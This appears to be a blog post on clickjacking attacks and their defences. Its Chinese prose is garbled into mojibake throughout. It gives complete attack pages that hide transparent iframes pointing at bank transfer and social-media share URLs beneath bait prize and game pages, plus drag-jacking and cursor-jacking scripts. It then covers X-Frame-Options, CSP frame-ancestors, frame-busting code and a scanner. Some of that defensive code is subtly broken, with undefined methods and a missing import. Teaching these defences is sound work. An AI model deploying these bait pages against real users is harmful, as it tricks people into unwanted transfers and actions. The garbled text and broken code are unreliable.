---
title: "ç‚¹å‡»åŠ«æŒ(Clickjacking)æ”»å‡»ä¸é˜²æŠ¤"
excerpt: "æ·±å…¥æ¢è®¨ç‚¹å‡»åŠ«æŒæ”»å‡»çš„åŸç†ã€ç±»å‹ã€å±å®³ä»¥åŠå…¨é¢çš„é˜²æŠ¤ç­–ç•¥ï¼Œå¸®åŠ©å¼€å‘è€…æ„å»ºæ›´å®‰å…¨çš„Webåº”ç”¨"
coverImage: "/assets/blog/dynamic-routing/cover.jpg"
date: "2025-12-04"
author:
  name: å°ç¾½
  picture: "/assets/blog/authors/jj.jpeg"
ogImage:
  url: "/assets/blog/dynamic-routing/cover.jpg"
---

# ç‚¹å‡»åŠ«æŒ(Clickjacking)æ”»å‡»ä¸é˜²æŠ¤

## å‰è¨€

ç‚¹å‡»åŠ«æŒ(Clickjacking)æ˜¯ä¸€ç§è§†è§‰æ¬ºéª—æ”»å‡»ï¼Œæ”»å‡»è€…é€šè¿‡å°†ç›®æ ‡ç½‘ç«™åµŒå…¥é€æ˜iframeï¼Œå¹¶è¦†ç›–å…¶ä»–å†…å®¹ï¼Œè¯±éª—ç”¨æˆ·ç‚¹å‡»éé¢„æœŸçš„ä½ç½®ã€‚è¿™ç§æ”»å‡»å¯ä»¥å¯¼è‡´ç”¨æˆ·åœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹æ‰§è¡Œæ•æ„Ÿæ“ä½œï¼Œå¦‚è½¬è´¦ã€ä¿®æ”¹å¯†ç ã€ä¸‹è½½æ¶æ„è½¯ä»¶ç­‰ã€‚æœ¬æ–‡å°†æ·±å…¥æ¢è®¨ç‚¹å‡»åŠ«æŒæ”»å‡»çš„åŸç†ã€ç±»å‹ã€å±å®³ä»¥åŠå…¨é¢çš„é˜²æŠ¤ç­–ç•¥ï¼Œå¸®åŠ©ä½ æ„å»ºæ›´å®‰å…¨çš„Webåº”ç”¨ã€‚

## ç‚¹å‡»åŠ«æŒæ”»å‡»åŸç†

### åŸºæœ¬æ”»å‡»æµç¨‹

```html
<!-- 1. æ”»å‡»è€…åˆ›å»ºæ¶æ„é¡µé¢ -->
<!DOCTYPE html>
<html>
<head>
  <title>æœ‰è¶£çš„å°æ¸¸æˆ</title>
  <style>
    /* éšè—ç›®æ ‡ç½‘ç«™ */
    .hidden-iframe {
      position: absolute;
      width: 100%;
      height: 100%;
      opacity: 0.0; /* å®Œå…¨é€æ˜ */
      z-index: 2;
      border: none;
    }
    
    /* è¯±é¥µå†…å®¹ */
    .decoy-content {
      position: absolute;
      width: 100%;
      height: 100%;
      z-index: 1;
    }
    
    /* è¯±é¥µæŒ‰é’® */
    .decoy-button {
      position: absolute;
      top: 200px;
      left: 300px;
      width: 120px;
      height: 40px;
      background-color: #4CAF50;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <!-- è¯±é¥µå†…å®¹ -->
  <div class="decoy-content">
    <h1>ç‚¹å‡»ä¸‹æ–¹æŒ‰é’®èµ¢å–å¤§å¥–ï¼</h1>
    <button class="decoy-button">ç‚¹å‡»èµ¢å¥–</button>
  </div>
  
  <!-- éšè—çš„ç›®æ ‡ç½‘ç«™ -->
  <iframe 
    class="hidden-iframe"
    src="https://bank.example.com/transfer?to=attacker&amount=1000">
  </iframe>
</body>
</html>

<!-- 2. ç”¨æˆ·çœ‹åˆ°çš„æ˜¯è¯±é¥µå†…å®¹ -->
<!-- ä½†å®é™…ç‚¹å‡»çš„æ˜¯é€æ˜iframeä¸­çš„è½¬è´¦æŒ‰é’® -->
```

### é«˜çº§ç‚¹å‡»åŠ«æŒæŠ€æœ¯

```html
<!-- 1. æ‹–æ‹½åŠ«æŒ(Dragjacking) -->
<!DOCTYPE html>
<html>
<head>
  <title>æ‹–æ‹½æ¸¸æˆ</title>
  <style>
    .game-area {
      width: 500px;
      height: 500px;
      border: 2px solid #333;
      position: relative;
      overflow: hidden;
    }
    
    .draggable {
      width: 100px;
      height: 100px;
      background-color: #3498db;
      position: absolute;
      cursor: move;
      z-index: 2;
    }
    
    .hidden-iframe {
      position: absolute;
      width: 100%;
      height: 100%;
      opacity: 0.0;
      z-index: 1;
      border: none;
      pointer-events: none; /* ç¦ç”¨iframeäº¤äº’ */
    }
    
    .drop-zone {
      width: 150px;
      height: 150px;
      background-color: #2ecc71;
      position: absolute;
      bottom: 20px;
      right: 20px;
      border-radius: 10px;
    }
  </style>
</head>
<body>
  <h1>å°†è“è‰²æ–¹å—æ‹–åˆ°ç»¿è‰²åŒºåŸŸ</h1>
  
  <div class="game-area">
    <div class="draggable" id="draggable"></div>
    <div class="drop-zone"></div>
    
    <!-- éšè—çš„ç›®æ ‡ç½‘ç«™ -->
    <iframe 
      class="hidden-iframe"
      id="target-iframe"
      src="https://social-media.example.com/share?message=I+love+this+product!">
    </iframe>
  </div>
  
  <script>
    const draggable = document.getElementById('draggable');
    const targetIframe = document.getElementById('target-iframe');
    let isDragging = false;
    let startX, startY;
    
    draggable.addEventListener('mousedown', (e) => {
      isDragging = true;
      startX = e.clientX;
      startY = e.clientY;
      
      // å¼€å§‹æ‹–æ‹½æ—¶å¯ç”¨iframeäº¤äº’
      targetIframe.style.pointerEvents = 'auto';
    });
    
    document.addEventListener('mousemove', (e) => {
      if (!isDragging) return;
      
      const deltaX = e.clientX - startX;
      const deltaY = e.clientY - startY;
      
      draggable.style.transform = `translate(${deltaX}px, ${deltaY}px)`;
    });
    
    document.addEventListener('mouseup', () => {
      isDragging = false;
      
      // åœæ­¢æ‹–æ‹½æ—¶ç¦ç”¨iframeäº¤äº’
      targetIframe.style.pointerEvents = 'none';
    });
  </script>
</body>
</html>

<!-- 2. å…‰æ ‡åŠ«æŒ(Cursorjacking) -->
<!DOCTYPE html>
<html>
<head>
  <title>å…‰æ ‡åŠ«æŒç¤ºä¾‹</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      cursor: none; /* éšè—çœŸå®å…‰æ ‡ */
    }
    
    .fake-cursor {
      position: absolute;
      width: 20px;
      height: 20px;
      background-image: url('cursor.png');
      pointer-events: none; /* ä¸å½±å“é¼ æ ‡äº‹ä»¶ */
      z-index: 1000;
    }
    
    .hidden-iframe {
      position: absolute;
      width: 100%;
      height: 100%;
      opacity: 0.0;
      z-index: 2;
      border: none;
    }
    
    .decoy-content {
      position: absolute;
      width: 100%;
      height: 100%;
      z-index: 1;
    }
  </style>
</head>
<body>
  <!-- è¯±é¥µå†…å®¹ -->
  <div class="decoy-content">
    <h1>ç‚¹å‡»ä¸‹æ–¹æŒ‰é’®è·å–å¥–åŠ±</h1>
    <button style="position: absolute; top: 200px; left: 300px;">è·å–å¥–åŠ±</button>
  </div>
  
  <!-- éšè—çš„ç›®æ ‡ç½‘ç«™ -->
  <iframe 
    class="hidden-iframe"
    src="https://example.com/subscribe">
  </iframe>
  
  <!-- å‡å…‰æ ‡ -->
  <div class="fake-cursor" id="fake-cursor"></div>
  
  <script>
    const fakeCursor = document.getElementById('fake-cursor');
    
    // è·Ÿè¸ªçœŸå®é¼ æ ‡ä½ç½®
    document.addEventListener('mousemove', (e) => {
      // åç§»å‡å…‰æ ‡ä½ç½®
      const offsetX = 100; // æ°´å¹³åç§»
      const offsetY = 50;  // å‚ç›´åç§»
      
      fakeCursor.style.left = (e.clientX + offsetX) + 'px';
      fakeCursor.style.top = (e.clientY + offsetY) + 'px';
    });
  </script>
</body>
</html>
```

## ç‚¹å‡»åŠ«æŒæ”»å‡»ç±»å‹

### ç»å…¸ç‚¹å‡»åŠ«æŒ

```html
<!-- 1. é“¶è¡Œè½¬è´¦ç‚¹å‡»åŠ«æŒ -->
<!DOCTYPE html>
<html>
<head>
  <title>å…è´¹æŠ½å¥–æ´»åŠ¨</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
    }
    
    .container {
      width: 100%;
      height: 100vh;
      position: relative;
      overflow: hidden;
    }
    
    .lottery-content {
      position: absolute;
      width: 100%;
      height: 100%;
      z-index: 1;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      text-align: center;
      padding-top: 50px;
    }
    
    .lottery-title {
      font-size: 2.5em;
      margin-bottom: 20px;
    }
    
    .lottery-description {
      font-size: 1.2em;
      margin-bottom: 30px;
    }
    
    .lottery-button {
      position: absolute;
      top: 300px;
      left: 50%;
      transform: translateX(-50%);
      width: 200px;
      height: 60px;
      background-color: #ff6b6b;
      color: white;
      border: none;
      border-radius: 30px;
      font-size: 1.5em;
      cursor: pointer;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
    }
    
    .hidden-iframe {
      position: absolute;
      width: 100%;
      height: 100%;
      opacity: 0.0;
      z-index: 2;
      border: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- è¯±é¥µå†…å®¹ -->
    <div class="lottery-content">
      <h1 class="lottery-title">ğŸ‰ å¹¸è¿å¤§æŠ½å¥– ğŸ‰</h1>
      <p class="lottery-description">
        ç‚¹å‡»ä¸‹æ–¹æŒ‰é’®ï¼Œæœ‰æœºä¼šèµ¢å–iPhone 14 Proï¼<br>
        100%ä¸­å¥–ï¼Œç»ä¸è½ç©ºï¼
      </p>
      
      <button class="lottery-button">ç«‹å³æŠ½å¥–</button>
    </div>
    
    <!-- éšè—çš„é“¶è¡Œè½¬è´¦é¡µé¢ -->
    <iframe 
      class="hidden-iframe"
      src="https://bank.example.com/transfer?to=attacker-account&amount=5000">
    </iframe>
  </div>
</body>
</html>
```

## ç‚¹å‡»åŠ«æŒé˜²æŠ¤ç­–ç•¥

### X-Frame-Optionså“åº”å¤´

```javascript
// 1. æœåŠ¡å™¨ç«¯è®¾ç½®X-Frame-Options
const express = require('express');
const helmet = require('helmet');
const app = express();

// ä½¿ç”¨helmetä¸­é—´ä»¶è®¾ç½®å®‰å…¨å¤´
app.use(helmet({
  frameguard: {
    action: 'deny' // 'deny', 'sameorigin', 'allow-from'
  }
}));

// æˆ–è€…æ‰‹åŠ¨è®¾ç½®X-Frame-Options
app.use((req, res, next) => {
  // DENY: å®Œå…¨ç¦æ­¢é¡µé¢è¢«åµŒå…¥iframe
  res.setHeader('X-Frame-Options', 'DENY');
  
  // SAMEORIGIN: åªå…è®¸åŒæºé¡µé¢åµŒå…¥
  // res.setHeader('X-Frame-Options', 'SAMEORIGIN');
  
  next();
});
```

### Content Security Policy (CSP) frame-ancestors

```javascript
// 1. æœåŠ¡å™¨ç«¯è®¾ç½®CSP frame-ancestors
const express = require('express');
const app = express();

// ä½¿ç”¨helmetä¸­é—´ä»¶è®¾ç½®CSP
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      ...helmet.contentSecurityPolicy.getDefaultDirectives(),
      "frame-ancestors": ["'none'"], // ç¦æ­¢æ‰€æœ‰iframeåµŒå…¥
      
      // åªå…è®¸åŒæºåµŒå…¥
      // "frame-ancestors": ["'self'"],
      
      // å…è®¸ç‰¹å®šåŸŸååµŒå…¥
      // "frame-ancestors": ["'self'", "https://trusted-site.com"],
    }
  }
}));
```

### JavaScripté˜²å¾¡æŠ€æœ¯

```javascript
// 1. æ£€æµ‹iframeåµŒå…¥
function checkForIframeEmbedding() {
  try {
    // æ£€æŸ¥å½“å‰çª—å£æ˜¯å¦æ˜¯é¡¶å±‚çª—å£
    if (window.self !== window.top) {
      // é¡µé¢è¢«åµŒå…¥iframeä¸­
      console.warn('Page is embedded in an iframe');
      
      // è·å–çˆ¶çª—å£URL
      const parentUrl = document.referrer;
      
      // æ£€æŸ¥æ˜¯å¦æ˜¯å¯ä¿¡åŸŸå
      const trustedDomains = [
        'https://trusted-site.com',
        'https://partner-site.com'
      ];
      
      const isTrustedDomain = trustedDomains.some(domain => 
        parentUrl.startsWith(domain)
      );
      
      if (!isTrustedDomain) {
        // æ£€æµ‹åˆ°æ¶æ„iframeåµŒå…¥
        handleMaliciousIframe();
      }
    }
  } catch (error) {
    // å¦‚æœæ— æ³•è®¿é—®window.topï¼Œå¯èƒ½æ˜¯è·¨åŸŸiframe
    console.error('Cannot access window.top, possible cross-origin iframe');
    handleMaliciousIframe();
  }
}

// 2. å¤„ç†æ¶æ„iframe
function handleMaliciousIframe() {
  // æ–¹æ³•1: é‡å®šå‘åˆ°å®‰å…¨é¡µé¢
  window.top.location = self.location;
  
  // æ–¹æ³•2: éšè—é¡µé¢å†…å®¹
  document.body.innerHTML = `
    <div style="text-align: center; padding: 50px;">
      <h1>å®‰å…¨è­¦å‘Š</h1>
      <p>æ­¤é¡µé¢ä¸å…è®¸åœ¨iframeä¸­æ˜¾ç¤ºã€‚</p>
      <a href="${window.location.href}" target="_blank">åœ¨æ–°çª—å£ä¸­æ‰“å¼€</a>
    </div>
  `;
}
```

## ç‚¹å‡»åŠ«æŒæ£€æµ‹ä¸ç›‘æ§

### è‡ªåŠ¨åŒ–ç‚¹å‡»åŠ«æŒæ‰«æ

```javascript
// 1. ç‚¹å‡»åŠ«æŒæ¼æ´æ‰«æå™¨
class ClickjackingScanner {
  constructor(baseUrl) {
    this.baseUrl = baseUrl;
    this.vulnerabilities = [];
  }
  
  // æ‰§è¡Œæ‰«æ
  async scan() {
    // 1. æ£€æŸ¥X-Frame-Optionså¤´
    await this.checkXFrameOptions();
    
    // 2. æ£€æŸ¥CSP frame-ancestors
    await this.checkCSPFrameAncestors();
    
    // 3. æµ‹è¯•iframeåµŒå…¥
    await this.testIframeEmbedding();
    
    // 4. ç”ŸæˆæŠ¥å‘Š
    return this.generateReport();
  }
  
  // æ£€æŸ¥X-Frame-Optionså¤´
  async checkXFrameOptions() {
    try {
      const response = await fetch(this.baseUrl);
      const xFrameOptions = response.headers.get('x-frame-options');
      
      if (!xFrameOptions) {
        this.vulnerabilities.push({
          type: 'missing_x_frame_options',
          severity: 'high',
          description: 'Missing X-Frame-Options header',
          recommendation: 'Set X-Frame-Options to DENY or SAMEORIGIN'
        });
      }
    } catch (error) {
      console.error('Error checking X-Frame-Options:', error);
    }
  }
  
  // ç”ŸæˆæŠ¥å‘Š
  generateReport() {
    const highSeverity = this.vulnerabilities.filter(v => v.severity === 'high').length;
    const mediumSeverity = this.vulnerabilities.filter(v => v.severity === 'medium').length;
    const lowSeverity = this.vulnerabilities.filter(v => v.severity === 'low').length;
    
    return {
      summary: {
        total: this.vulnerabilities.length,
        high: highSeverity,
        medium: mediumSeverity,
        low: lowSeverity
      },
      vulnerabilities: this.vulnerabilities,
      recommendations: this.generateRecommendations()
    };
  }
}
```

## å®é™…åº”ç”¨æ¡ˆä¾‹

### é“¶è¡Œç½‘ç«™çš„ç‚¹å‡»åŠ«æŒé˜²æŠ¤

```javascript
// 1. é“¶è¡Œç½‘ç«™ - æœåŠ¡å™¨ç«¯é˜²æŠ¤
const express = require('express');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');

const app = express();

// ä½¿ç”¨helmetä¸­é—´ä»¶è®¾ç½®å®‰å…¨å¤´
app.use(helmet({
  frameguard: {
    action: 'deny' // ç¦æ­¢æ‰€æœ‰iframeåµŒå…¥
  },
  contentSecurityPolicy: {
    directives: {
      ...helmet.contentSecurityPolicy.getDefaultDirectives(),
      "frame-ancestors": ["'none'"] // ç¦æ­¢æ‰€æœ‰iframeåµŒå…¥
    }
  }
}));

// é™åˆ¶æ•æ„Ÿæ“ä½œé¢‘ç‡
const sensitiveOperationLimiter = rateLimit({
  windowMs: 60 * 1000, // 1åˆ†é’Ÿ
  max: 5, // æ¯åˆ†é’Ÿæœ€å¤š5æ¬¡æ“ä½œ
  message: { error: 'Too many requests, please try again later' }
});

// è½¬è´¦API - å¤šå±‚é˜²æŠ¤
app.post('/api/transfer', 
  sensitiveOperationLimiter,
  (req, res) => {
    const { toAccount, amount } = req.body;
    
    // å¤„ç†è½¬è´¦é€»è¾‘
    // ...
    
    res.json({ success: true, transactionId: 'txn_' + Date.now() });
  }
);
```

## æ€»ç»“

ç‚¹å‡»åŠ«æŒæ˜¯ä¸€ç§éšè”½ä½†å±å®³æ€§æå¤§çš„Webå®‰å…¨å¨èƒã€‚é€šè¿‡æœ¬æ–‡çš„ä»‹ç»ï¼Œæˆ‘ä»¬äº†è§£äº†ç‚¹å‡»åŠ«æŒçš„æ”»å‡»åŸç†ã€ç±»å‹ã€å±å®³ä»¥åŠå…¨é¢çš„é˜²æŠ¤ç­–ç•¥ã€‚

### å…³é”®é˜²æŠ¤æªæ–½

1. **æœåŠ¡å™¨ç«¯é˜²æŠ¤**ï¼š
   - è®¾ç½®X-Frame-Optionså“åº”å¤´
   - ä½¿ç”¨CSP frame-ancestorsæŒ‡ä»¤
   - å®æ–½å¤šå±‚å®‰å…¨é˜²æŠ¤

2. **å®¢æˆ·ç«¯é˜²æŠ¤**ï¼š
   - æ£€æµ‹iframeåµŒå…¥
   - å®ç°JavaScripté˜²å¾¡æœºåˆ¶
   - ç›‘æ§å¯ç–‘æ´»åŠ¨

3. **å®‰å…¨ç›‘æ§**ï¼š
   - è‡ªåŠ¨åŒ–æ¼æ´æ‰«æ
   - æ”»å‡»æ¨¡å¼æ£€æµ‹
   - å®‰å…¨äº‹ä»¶è®°å½•

### æœ€ä½³å®è·µ

1. **æ·±åº¦é˜²å¾¡**ï¼šç»“åˆå¤šç§é˜²æŠ¤æŠ€æœ¯ï¼Œæ„å»ºå¤šå±‚æ¬¡å®‰å…¨ä½“ç³»
2. **æœ€å°æƒé™åŸåˆ™**ï¼šåªå…è®¸å¿…è¦çš„iframeåµŒå…¥
3. **æŒç»­ç›‘æ§**ï¼šå®šæœŸæ‰«æå’Œç›‘æ§ï¼ŒåŠæ—¶å‘ç°å®‰å…¨æ¼æ´
4. **å®‰å…¨æ„è¯†**ï¼šæé«˜å¼€å‘è€…å’Œç”¨æˆ·çš„å®‰å…¨æ„è¯†

é€šè¿‡å®æ–½è¿™äº›é˜²æŠ¤æªæ–½ï¼Œæˆ‘ä»¬å¯ä»¥æœ‰æ•ˆé˜²èŒƒç‚¹å‡»åŠ«æŒæ”»å‡»ï¼Œä¿æŠ¤ç”¨æˆ·å’Œåº”ç”¨ç¨‹åºçš„å®‰å…¨ã€‚è®°ä½ï¼ŒWebå®‰å…¨æ˜¯ä¸€ä¸ªæŒç»­çš„è¿‡ç¨‹ï¼Œéœ€è¦ä¸æ–­å­¦ä¹ å’Œæ›´æ–°é˜²æŠ¤ç­–ç•¥ã€‚